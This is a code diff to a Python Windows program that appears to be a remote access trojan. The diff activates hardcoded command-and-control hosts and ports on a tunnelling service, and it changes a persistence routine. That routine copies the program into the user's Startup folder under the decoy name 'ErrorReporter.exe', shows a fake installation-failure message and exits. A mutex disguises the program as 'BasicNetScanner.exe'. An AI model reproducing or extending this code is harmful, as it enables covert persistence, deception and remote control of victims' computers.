@@ -17,6 +17,7 @@ from win32api import GetLastError
 from winerror import ERROR_ALREADY_EXISTS
 import struct, easygui
 import ctypes
+import shutil
 
 def is_admin():
     try:
@@ -29,15 +30,15 @@ if is_admin():
 else:
     handle = CreateMutex(None, 1, "BasicNetScanner.exe")
 
-SERVER_HOST = ~hostname~
-TRANSFER_HOST = ~tname~
-TRANSFER_PORT = ~tport~
-SERVER_PORT = ~port~
+#SERVER_HOST = ~hostname~
+#TRANSFER_HOST = ~tname~
+#TRANSFER_PORT = ~tport~
+#SERVER_PORT = ~port~
 
-#SERVER_HOST = "pst-tramadol.at.ply.gg"
-#TRANSFER_HOST = "war-cow.at.ply.gg"
-#TRANSFER_PORT = 54017
-#SERVER_PORT = 38363
+SERVER_HOST = "pst-tramadol.at.ply.gg"
+TRANSFER_HOST = "war-cow.at.ply.gg"
+TRANSFER_PORT = 54017
+SERVER_PORT = 38363
 
 BUFFER_SIZE = 4096
 # separator string for sending 2 messages in one go
@@ -480,11 +481,13 @@ if __name__ == "__main__":
     #       client.start()
     #   except Exception as e:
     #       print(e)
-    loc = os.path.basename(os.path.abspath(sys.argv[0]))
+    loc = os.path.dirname(os.path.abspath(sys.argv[0]))
+    print(loc)
     dest = f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
     dest2 = dest.replace("/", "\\")
+    print(dest, dest2)
     if not (loc == dest or loc == dest2):
-        shutil.move(sys.argv[0], f"C:/Users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/ErrorReporter.exe")
+        shutil.copyfile(sys.argv[0], f"C:/Users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/ErrorReporter.exe")
         easygui.msgbox("unable to install the program, try again later")
         sys.exit(1)
     else:
